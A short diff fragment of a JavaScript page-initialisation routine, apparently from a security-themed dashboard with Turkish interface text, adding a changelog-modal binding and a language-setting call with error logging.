                 }
             });
         }
@@ -5968,6 +7346,7 @@ Kullanılabilir 142 aracı görmek için 'help' yazın veya sol paneldeki hızl�
         try { initAdminSuperpowers(); } catch (e) { }
         try { bindSimulator(); } catch (e) { }
         try { bindAuthModal(); } catch (e) { }
+        try { bindChangelogModal(); } catch (e) { console.error("[Changelog Error]", e); }
         try { bindAccessLogsPanel(); } catch (e) { }
 
         // 5. Theme & fail-safe content reveal
@@ -5977,6 +7356,7 @@ Kullanılabilir 142 aracı görmek için 'help' yazın veya sol paneldeki hızl�
         try { await restoreSession(); } catch (e) { }
         try { startAttackStream(); } catch (e) { }
         try { renderSessionStorageInspector(); } catch (e) { }
+        try { if (window.I18N) window.I18N.setLanguage(I18N.currentLang); } catch (e) { console.error('[i18n Error]', e); }
     }
 
     if (document.readyState === 'loading') {
